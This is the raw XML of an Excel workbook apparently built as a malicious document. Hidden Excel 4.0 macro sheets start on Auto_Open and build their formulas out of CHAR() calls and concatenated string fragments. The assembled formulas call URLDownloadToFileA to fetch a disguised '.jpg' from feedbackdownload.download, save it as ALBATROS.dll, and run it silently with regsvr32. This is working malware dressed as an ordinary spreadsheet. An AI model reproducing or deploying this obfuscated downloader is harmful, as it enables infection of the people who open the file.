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intlsheet1.xml" ContentType="application/vnd.ms-excel.intlmacrosheet+xml"/>
  <Override PartName="/xl/worksheets/sheet2.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
  <Override PartName="/xl/macrosheets/intlsheet2.xml" ContentType="application/vnd.ms-excel.intlmacrosheet+xml"/>
  <Override PartName="/xl/macrosheets/intlsheet3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defaultThemeVersion="164011"/>
  <bookViews>
    <workbookView xWindow="0" yWindow="0" windowWidth="22260" windowHeight="12645"/>
  </bookViews>
  <sheets>
    <sheet name="Sheet" sheetId="5" r:id="rId1"/>
    <sheet name="Sheet1" sheetId="2" r:id="rId2"/>
    <sheet name="Sheet2" sheetId="1" r:id="rId3"/>
    <sheet name="Sheet3" sheetId="6" r:id="rId4"/>
    <sheet name="Sheet4" sheetId="7" r:id="rId5"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm.Auto_Open">Sheet1!$CG$11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J29" i="1" l="1"/>
  <c r="CJ28" i="1" l="1"/>
  <c r="CG28" i="1" s="1"/>
  <c r="CG30" i="1"/>
  <c r="CI9" i="1"/>
  <c r="CH9" i="1" s="1"/>
  <c r="CG9" i="1" s="1"/>
  <c r="CJ9" i="1"/>
  <c r="CK9" i="1"/>
  <c r="CH10" i="1"/>
  <c r="CI10" i="1"/>
  <c r="CJ10" i="1"/>
  <c r="CK10" i="1"/>
  <c r="CI16" i="1"/>
  <c r="CH16" i="1" s="1"/>
  <c r="CI17" i="1"/>
  <c r="CJ17" i="1"/>
  <c r="CK17" i="1"/>
  <c r="CL17" i="1"/>
  <c r="CI18" i="1"/>
  <c r="CH18" i="1" s="1"/>
  <c r="CJ18" i="1"/>
  <c r="CK18" i="1"/>
  <c r="CL18" i="1"/>
  <c r="CI19" i="1"/>
  <c r="CJ19" i="1"/>
  <c r="CI20" i="1"/>
  <c r="CJ20" i="1"/>
  <c r="CK20" i="1"/>
  <c r="CL20" i="1"/>
  <c r="CI21" i="1"/>
  <c r="CI23" i="1"/>
  <c r="CG23" i="1" s="1"/>
  <c r="CJ23" i="1"/>
  <c r="CK23" i="1"/>
  <c r="CL23" i="1"/>
  <c r="CK24" i="1"/>
  <c r="CL24" i="1"/>
  <c r="CG25" i="1"/>
  <c r="CC9" i="1"/>
  <c r="CB8" i="1" s="1"/>
  <c r="CC10" i="1"/>
  <c r="CB15" i="1"/>
  <c r="CC26" i="1"/>
  <c r="CB26" i="1" s="1"/>
  <c r="CC27" i="1"/>
  <c r="CC28" i="1"/>
  <c r="CJ39" i="1"/>
  <c r="CI39" i="1" s="1"/>
  <c r="CG39" i="1" s="1"/>
  <c r="CK39" i="1"/>
  <c r="CI40" i="1"/>
  <c r="CJ40" i="1"/>
  <c r="CK40" i="1"/>
  <c r="CJ41" i="1"/>
  <c r="CI41" i="1" s="1"/>
  <c r="CK41" i="1"/>
  <c r="CI42" i="1"/>
  <c r="CG40" i="1" s="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="17" uniqueCount="15">
  <si>
    <t>=</t>
  </si>
  <si>
    <t>EX</t>
  </si>
  <si>
    <t>EC</t>
  </si>
  <si>
    <t>tp</t>
  </si>
  <si>
    <t>",0,0)</t>
  </si>
  <si>
    <t>d</t>
  </si>
  <si>
    <t>l</t>
  </si>
  <si>
    <t>")</t>
  </si>
  <si>
    <t>()</t>
  </si>
  <si>
    <t>://</t>
  </si>
  <si>
    <t>","</t>
  </si>
  <si>
    <t>"&amp;"</t>
  </si>
  <si>
    <t>"h</t>
  </si>
  <si>
    <t>t</t>
  </si>
  <si>
    <t>..\ALBATROS.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</si>
</sst>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0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="0" fontId="1" fillId="0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microsoft.com/office/2006/relationships/xlIntlMacrosheet" Target="macrosheets/intl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6/relationships/xlIntlMacrosheet" Target="macrosheets/intlsheet3.xml"/><Relationship Id="rId4" Type="http://schemas.microsoft.com/office/2006/relationships/xlIntlMacrosheet" Target="macrosheets/intlsheet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9525</xdr:colOff>
      <xdr:row>57</xdr:row>
      <xdr:rowOff>123825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982325" cy="10982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_rels/intl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macrosheets/_rels/intl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CG12:CH14"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="4.5703125" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="4.5703125" style="2"/>
  </cols>
  <sheetData>
    <row r="12" spans="85:86" x14ac:dyDescent="0.25">
      <c r="CG12" s="2" t="str">
        <f>NOW()&amp;".jpg"</f>
        <v>44389,7571259259.jpg</v>
      </c>
    </row>
    <row r="13" spans="85:86" x14ac:dyDescent="0.25">
      <c r="CG13" s="2" t="e">
        <f>SET.VALUE(CG16,Sheet2!CB8&amp;Sheet2!CG9&amp;Sheet2!CH16&amp;Sheet2!CH18&amp;Sheet2!CG23&amp;Sheet2!CG25&amp;Sheet2!CG28&amp;Sheet2!CG30)=CH12()</f>
        <v>#N/A</v>
      </c>
      <c r="CH13" s="2" t="e">
        <f>SET.VALUE(CG17,Sheet2!CB15&amp;Sheet2!CG39&amp;Sheet2!CG40)</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="14" spans="85:86" x14ac:dyDescent="0.25">
      <c r="CH14" s="2" t="b">
        <f>Sheet4!CF18()</f>
        <v>0</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup paperSize="9" orientation="portrait" r:id="rId1"/>
</xm:macrosheet>
</file>

<file path=xl/macrosheets/intl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CD16:CD17"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="4.5703125" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="4.5703125" style="2"/>
  </cols>
  <sheetData>
    <row r="16" spans="82:82" x14ac:dyDescent="0.25">
      <c r="CD16" s="2" t="b">
        <f>FORMULA(Sheet1!CG16,CA16)</f>
        <v>0</v>
      </c>
    </row>
    <row r="17" spans="82:82" x14ac:dyDescent="0.25">
      <c r="CD17" s="2" t="b">
        <f>Sheet4!CB13()</f>
        <v>0</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup orientation="portrait" r:id="rId1"/>
</xm:macrosheet>
</file>

<file path=xl/macrosheets/intl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CB14:CF19"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="4.5703125" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="4.5703125" style="2"/>
  </cols>
  <sheetData>
    <row r="14" spans="80:80" x14ac:dyDescent="0.25">
      <c r="CB14" s="2" t="b">
        <f>FORMULA(Sheet1!CG17,Sheet3!CA17)</f>
        <v>0</v>
      </c>
    </row>
    <row r="15" spans="80:80" x14ac:dyDescent="0.25">
      <c r="CB15" s="2" t="b">
        <f>FORMULA(CF21,Sheet3!CA18)=Sheet3!CA14()</f>
        <v>1</v>
      </c>
    </row>
    <row r="19" spans="84:84" x14ac:dyDescent="0.25">
      <c r="CF19" s="2" t="e">
        <f>SET.VALUE(CF21,Sheet2!CB26)=Sheet3!CD15()</f>
        <v>#N/A</v>
      </c>
    </row>
  </sheetData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5" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.14062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B8:CL42"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="9.140625" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="2"/>
  </cols>
  <sheetData>
    <row r="8" spans="80:89" x14ac:dyDescent="0.25">
      <c r="CB8" s="2" t="str">
        <f>CC8&amp;CC9&amp;CC10</f>
        <v>=CALL</v>
      </c>
      <c r="CC8" s="2" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="9" spans="80:89" x14ac:dyDescent="0.25">
      <c r="CC9" s="2" t="str">
        <f>"CA"</f>
        <v>CA</v>
      </c>
      <c r="CG9" s="2" t="str">
        <f>IF(1+4,CH9&amp;CH10,52)&amp;""","</f>
        <v>("URLMon",</v>
      </c>
      <c r="CH9" s="2" t="str">
        <f>"("&amp;""""&amp;CI9&amp;CJ9&amp;CK9</f>
        <v>("URL</v>
      </c>
      <c r="CI9" s="2" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="CJ9" s="2" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="CK9" s="2" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
    </row>
    <row r="10" spans="80:89" x14ac:dyDescent="0.25">
      <c r="CC10" s="2" t="str">
        <f>"LL"</f>
        <v>LL</v>
      </c>
      <c r="CH10" s="2" t="str">
        <f>CI10&amp;CJ10&amp;CK10</f>
        <v>Mon</v>
      </c>
      <c r="CI10" s="2" t="str">
        <f>CHAR(77)</f>
        <v>M</v>
      </c>
      <c r="CJ10" s="2" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="CK10" s="2" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
    </row>
    <row r="15" spans="80:89" x14ac:dyDescent="0.25">
      <c r="CB15" s="2" t="str">
        <f>CC15&amp;CC16&amp;CC17</f>
        <v>=EXEC</v>
      </c>
      <c r="CC15" s="2" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="16" spans="80:89" x14ac:dyDescent="0.25">
      <c r="CC16" s="2" t="s">
        <v>1</v>
      </c>
      <c r="CH16" s="2" t="str">
        <f>""""&amp;CI16&amp;CI17&amp;CJ17&amp;CK17&amp;CL17</f>
        <v>"URLDown</v>
      </c>
      <c r="CI16" s="2" t="str">
        <f>CI9&amp;CJ9&amp;CK9</f>
        <v>URL</v>
      </c>
    </row>
    <row r="17" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CC17" s="2" t="s">
        <v>2</v>
      </c>
      <c r="CI17" s="2" t="str">
        <f>CHAR(68)</f>
        <v>D</v>
      </c>
      <c r="CJ17" s="2" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="CK17" s="2" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
      <c r="CL17" s="2" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
    </row>
    <row r="18" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CH18" s="2" t="str">
        <f>CI18&amp;CJ18&amp;CK18&amp;CL18&amp;CI19&amp;CJ19&amp;CI20&amp;CJ20&amp;CK20&amp;CL20&amp;CI21&amp;""","</f>
        <v>loadToFileA",</v>
      </c>
      <c r="CI18" s="2" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="CJ18" s="2" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="CK18" s="2" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
      <c r="CL18" s="2" t="str">
        <f>CHAR(100)</f>
        <v>d</v>
      </c>
    </row>
    <row r="19" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CG19" s="3"/>
      <c r="CH19" s="3"/>
      <c r="CI19" s="2" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="CJ19" s="2" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
    </row>
    <row r="20" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CI20" s="2" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="CJ20" s="2" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="CK20" s="2" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="CL20" s="2" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="21" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CI21" s="2" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
    </row>
    <row r="23" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CG23" s="2" t="str">
        <f>""""&amp;CI23&amp;CJ23&amp;CK23&amp;CL23&amp;CK24&amp;CL24&amp;""","</f>
        <v>"JJCCBB",</v>
      </c>
      <c r="CI23" s="2" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="CJ23" s="2" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="CK23" s="2" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="CL23" s="2" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
    </row>
    <row r="24" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CK24" s="2" t="str">
        <f>CHAR(66)</f>
        <v>B</v>
      </c>
      <c r="CL24" s="2" t="str">
        <f>CHAR(66)</f>
        <v>B</v>
      </c>
    </row>
    <row r="25" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CG25" s="2" t="str">
        <f>0&amp;","</f>
        <v>0,</v>
      </c>
    </row>
    <row r="26" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CB26" s="2" t="str">
        <f>CC26&amp;CC27&amp;CC28&amp;CC29</f>
        <v>=HALT()</v>
      </c>
      <c r="CC26" s="2" t="str">
        <f>"="</f>
        <v>=</v>
      </c>
    </row>
    <row r="27" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CC27" s="2" t="str">
        <f>"HA"</f>
        <v>HA</v>
      </c>
      <c r="CI27" s="2" t="s">
        <v>3</v>
      </c>
      <c r="CJ27" s="2" t="s">
        <v>9</v>
      </c>
      <c r="CK27" s="2" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="28" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CC28" s="2" t="str">
        <f>"LT"</f>
        <v>LT</v>
      </c>
      <c r="CG28" s="2" t="str">
        <f>CJ28&amp;CJ29&amp;CK29</f>
        <v>"http://feedbackdownload.download/44389,7571259259.jpg","</v>
      </c>
      <c r="CI28" s="2" t="s">
        <v>12</v>
      </c>
      <c r="CJ28" s="2" t="str">
        <f>CI28&amp;CK27&amp;CI27&amp;CJ27</f>
        <v>"http://</v>
      </c>
    </row>
    <row r="29" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CC29" s="2" t="s">
        <v>8</v>
      </c>
      <c r="CJ29" s="2" t="str">
        <f>"feedbackdownload.download/"&amp;Sheet1!CG12</f>
        <v>feedbackdownload.download/44389,7571259259.jpg</v>
      </c>
      <c r="CK29" s="2" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="30" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CG30" s="2" t="str">
        <f>CJ30&amp;CJ31&amp;CJ32&amp;CJ33&amp;CK30</f>
        <v>..\ALBATROS.dll",0,0)</v>
      </c>
      <c r="CJ30" s="2" t="s">
        <v>14</v>
      </c>
      <c r="CK30" s="2" t="s">
        <v>4</v>
      </c>
    </row>
    <row r="31" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CJ31" s="2" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="32" spans="80:90" x14ac:dyDescent="0.25">
      <c r="CJ32" s="2" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="33" spans="85:89" x14ac:dyDescent="0.25">
      <c r="CJ33" s="2" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="39" spans="85:89" x14ac:dyDescent="0.25">
      <c r="CG39" s="2" t="str">
        <f>CI39&amp;CI40&amp;CI41</f>
        <v>("regsvr</v>
      </c>
      <c r="CI39" s="3" t="str">
        <f>"("&amp;""""&amp;CJ39&amp;CK39</f>
        <v>("re</v>
      </c>
      <c r="CJ39" s="3" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="CK39" s="3" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="40" spans="85:89" x14ac:dyDescent="0.25">
      <c r="CG40" s="2" t="str">
        <f>CI42&amp;CJ42&amp;CJ30&amp;CJ31&amp;CJ32&amp;CJ33&amp;CK42</f>
        <v>32 -silent "&amp;"..\ALBATROS.dll")</v>
      </c>
      <c r="CI40" s="3" t="str">
        <f>CJ40&amp;CK40</f>
        <v>gs</v>
      </c>
      <c r="CJ40" s="3" t="str">
        <f>CHAR(103)</f>
        <v>g</v>
      </c>
      <c r="CK40" s="3" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
    </row>
    <row r="41" spans="85:89" x14ac:dyDescent="0.25">
      <c r="CI41" s="3" t="str">
        <f>CJ41&amp;CK41</f>
        <v>vr</v>
      </c>
      <c r="CJ41" s="3" t="str">
        <f>CHAR(118)</f>
        <v>v</v>
      </c>
      <c r="CK41" s="3" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
    </row>
    <row r="42" spans="85:89" x14ac:dyDescent="0.25">
      <c r="CI42" s="3" t="str">
        <f>SQRT(1024)&amp;" -silent "</f>
        <v xml:space="preserve">32 -silent </v>
      </c>
      <c r="CJ42" s="3" t="s">
        <v>11</v>
      </c>
      <c r="CK42" s="3" t="s">
        <v>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Макросы Excel 4.0</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>3</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="5" baseType="lpstr">
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>Sheet2</vt:lpstr>
      <vt:lpstr>Sheet1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2021-07-27T10:44:44Z</dcterms:modified>
</cp:coreProperties>
</file>